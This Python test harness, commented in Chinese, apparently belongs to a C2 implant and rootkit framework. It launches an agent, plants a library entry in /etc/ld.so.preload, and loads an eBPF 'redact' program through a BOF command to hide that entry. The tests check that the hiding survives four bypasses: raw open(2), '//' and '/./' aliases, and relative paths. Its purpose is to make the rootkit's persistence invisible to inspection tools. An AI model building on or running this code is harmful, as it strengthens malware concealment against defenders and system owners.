#!/usr/bin/env python3
"""redact 对抗面的**绕过口**验收 —— p15 的 17/17 没覆盖到的那一片（ISS-054/055）

被测性质一句话：**"有工具在读 preload" 这件事，必须与"它用哪条 syscall、哪条路径
写法"无关**。p15 只测了 `os.open(规范路径)` 这一种写法，于是四个绕过口全开：

  B1 open(2)   x64 上 `open`=2 与 `openat`=257 是**两条不同的 syscall**，redact 只挂
               了 257。静态链接程序 / musl / 直调 syscall / **我们自己的 AxOpenFile**
               全走 2。（arm64 没有 `open(2)`：`sys_open` 就是 `openat` → 该架构不中招）
  B2 //  别名   `/etc//ld.so.preload`     —— 字面比较漏放
  B3 /./ 别名   `/etc/./ld.so.preload`    —— 同上
  B4 相对路径   `cwd=/etc` 时读 `ld.so.preload`

阳性对照（ISS-020 规则）：
  T0a  mmap 真身**看得见** SO 行 —— 否则"读不到"什么都证明不了（mmap 是唯一绕过
       BPF 的读法：redact 只 hook read(2)，这是 P3-A 已归档的固有边界）
  T0b  加载 redact **之前**，5 条读法**都**看得见 SO —— 证明探针本身有效

  T-load redact 已加载（pin=axp16）
  T1  规范路径 os.open（p15 已证的那条，此处作**同运行内对照**）
  T2  ★B1 直调 open(2)
  T3  ★B2 双斜杠别名
  T4  ★B3 单点别名
  T5  ★B4 相对路径
  T6  5 条读法：总长 == 真身 && DECOY 行原样（是**等长改写**，不是截断/清空）
  T7  unload 后 os.open 又能读到 SO（读时改写可逆；同时证明卸载链路仍通）

判据固定为"**读到就得是抹平的**"，所以本脚本在**修前**跑是红的（拿到证据），
修后跑是绿的 —— 即标准的修前红 / 修后绿。
"""
import ctypes
import os
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import e2e
import gap10_rootkit_verify as g10
import p03_hide_link_verify as p03
import p15_redact_verify as p15            # read_tracked / read_true_mmap

PIN = "axp16"
LISTENER = "TestHTTP"
PRELOAD = "/etc/ld.so.preload"
SO = "/usr/lib/libaxp16.so"
DECOY = "/usr/lib/libnss_real.so"
SYS_OPEN = 2                               # x86_64
R = []


def rec(item, ok, note=""):
    R.append(bool(ok))
    print("  [%-4s] %-52s %s" % ("PASS" if ok else "FAIL", item, note), flush=True)


_libc = ctypes.CDLL(None, use_errno=True)
_libc.syscall.restype = ctypes.c_long
_libc.syscall.argtypes = [ctypes.c_long, ctypes.c_char_p, ctypes.c_long, ctypes.c_long]


def read_open2(path, n=4096):
    """★B1：直调 `open(2)`。glibc 的 `open()` 其实是 `openat` 的包装 —— 要复现
    "静态链接/musl 程序"的行为，只能走 raw syscall。fd 拿到后照样用 `os.read`
    （走 read(2)）→ redact 的 read 分支一定看得到它。"""
    ctypes.set_errno(0)
    fd = _libc.syscall(SYS_OPEN, path.encode(), os.O_RDONLY, 0)
    if fd < 0:
        return None
    try:
        return os.read(fd, n)
    finally:
        os.close(fd)


def read_rel(name, n=4096):
    """★B4：cwd 下的相对路径。redact 拿到的是不含 `/` 的短串。"""
    cwd = os.getcwd()
    os.chdir("/etc")
    try:
        return p15.read_tracked(name, n)[1]
    finally:
        os.chdir(cwd)


def kill(pid):
    try:
        os.kill(pid, 9)
    except OSError:
        pass


def main():
    pid0, a0, loaded, bak = None, None, False, None
    try:
        bin0 = e2e.gen_agent(LISTENER, "p16a0")
        pid0 = e2e.launch(bin0)
        a0 = e2e.wait_registered(LISTENER, pid0, timeout=90)
        print("[env] A0 aid=%s pid=%d" % (a0, pid0), flush=True)

        if os.path.exists(PRELOAD):
            with open(PRELOAD, "rb") as f:
                bak = f.read()
        with open(PRELOAD, "w") as f:
            f.write(SO + "\n" + DECOY + "\n")
        true_body = p15.read_true_mmap(PRELOAD)
        rec("T0a 阳性对照：mmap 真身看得见 SO 行", SO.encode() in true_body,
            "真身 %d 字节" % len(true_body))

        # ── T0b：加载前，5 条读法都得看得见（否则后面红了也不知道是谁的错）──
        pre = {
            "规范": p15.read_tracked(PRELOAD)[1],
            "open2": read_open2(PRELOAD),
            "//": p15.read_tracked("/etc//ld.so.preload")[1],
            "/./": p15.read_tracked("/etc/./ld.so.preload")[1],
            "相对": read_rel("ld.so.preload"),
        }
        vis = " ".join("%s=%s" % (k, "有" if (v and SO.encode() in v) else "无")
                       for k, v in pre.items())
        rec("T0b 对照：加载前 5 条读法都看得见 SO", all(
            v is not None and SO.encode() in v for v in pre.values()), vis)

        # ── 加载 redact ────────────────────────────────────────────────────
        txt = p03.run_bof(a0, "ebpf_load", g10.pack_load(
            "%s/redact.insns.bin" % g10.BPF_OUT, "%s/redact.mapreloc.txt" % g10.BPF_OUT,
            5, 1, "raw_syscalls/sys_exit", SO.encode(), "", b"", PIN), timeout=90) or ""
        loaded = ("failed" not in txt) and ("attached" in txt or "cpus=" in txt)
        rec("T-load redact 已加载 (pin=%s)" % PIN, loaded,
            (txt.strip().splitlines() or [""])[-1][:60])
        if not loaded:
            print("[abort] redact 未加载（verifier 拒绝？见上一行回执）", flush=True)
            return 1
        time.sleep(1)

        # ── 核心：5 条读法都必须读不到 SO ──────────────────────────────────
        got = {
            "T1  规范路径 os.open（对照）": p15.read_tracked(PRELOAD)[1],
            "T2  ★B1 直调 open(2)": read_open2(PRELOAD),
            "T3  ★B2 /etc//ld.so.preload": p15.read_tracked("/etc//ld.so.preload")[1],
            "T4  ★B3 /etc/./ld.so.preload": p15.read_tracked("/etc/./ld.so.preload")[1],
            "T5  ★B4 cwd=/etc 相对路径": read_rel("ld.so.preload"),
        }
        for k, v in got.items():
            if v is None:
                rec(k, False, "读失败")
            else:
                rec(k + " 看不见 SO", SO.encode() not in v,
                    ("★ 仍看得见真内容 len=%d" % len(v)) if SO.encode() in v
                    else "已抹平 len=%d" % len(v))

        lens = set(len(v) for v in got.values() if v is not None)
        decoy_ok = all(v is not None and DECOY.encode() in v for v in got.values())
        rec("T6 等长改写 + DECOY 原样（5 条长度一致且都留第 2 行）",
            lens == {len(true_body)} and decoy_ok,
            "长度=%s 真身=%d DECOY保留=%s" % (sorted(lens), len(true_body), decoy_ok))

        # ── T7：卸载后复原（读时改写可逆 + 卸载链路仍通）──────────────────
        txt = p03.run_bof(a0, "ebpf_unload", g10.pack_unload(PIN), timeout=60) or ""
        loaded = False
        time.sleep(1)
        back = p15.read_tracked(PRELOAD)[1]
        rec("T7 unload 后 os.open 又看得见 SO（可逆 + 链路通）", SO.encode() in back,
            "len=%d" % len(back))
        return 0 if all(R) else 1
    finally:
        if loaded and a0:
            try:
                p03.run_bof(a0, "ebpf_unload", g10.pack_unload(PIN), timeout=60)
            except Exception as e:
                print("[warn] unload(final): %s" % e, flush=True)
        # preload 对全机每次 exec 都生效，留一秒都是噪声 → 无条件还原
        try:
            if bak is None:
                os.remove(PRELOAD)
            else:
                with open(PRELOAD, "wb") as f:
                    f.write(bak)
        except OSError:
            pass
        print("[env] %s 已还原 = %s" % (PRELOAD, not os.path.exists(PRELOAD)), flush=True)
        if pid0:
            kill(pid0)
        print("\n[warn] 台面 = %d/%d" % (sum(R), len(R)), flush=True)


if __name__ == "__main__":
    sys.exit(main())
